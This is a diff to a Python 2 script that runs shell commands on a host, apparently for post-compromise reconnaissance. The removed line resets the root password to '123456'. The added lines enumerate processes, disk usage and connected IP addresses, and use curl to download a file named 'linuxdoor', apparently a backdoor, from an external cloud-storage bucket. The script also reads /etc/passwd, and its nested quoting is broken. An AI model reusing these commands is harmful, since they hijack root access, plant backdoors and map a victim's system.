@@ -14,8 +14,29 @@ with open('/etc/passwd', 'r') as fin:
 
 #find out who i am
 
-print "add user"
-p = subprocess.Popen("echo "123456" | passwd –-stdin root", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+print "df"
+p = subprocess.Popen("df -h", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+print p.communicate()[0]
+
+print "ps -ef"
+p = subprocess.Popen("ps -ef", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+print p.communicate()[0]
+
+print "netstat"
+p = subprocess.Popen("netstat -ntu | awk '{print $5}' | egrep -o "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | sort | uniq -c | sort -nr", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+print p.communicate()[0]
+
+print "get"
+p = subprocess.Popen("curl -o 9.zip "http://software-download.microsoft.com/pr/Win10_Chinese(Simplified)_x32.iso?t=wooyun"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+print p.communicate()[0]
+
+
+print "get2"
+p = subprocess.Popen("curl -o linuxdoor "http://tlbb.oss-cn-hangzhou.aliyuncs.com/linuxdoor"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+print p.communicate()[0]
+
+print "ls"
+p = subprocess.Popen("ls", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 print p.communicate()[0]
 
 print "ifconfig"
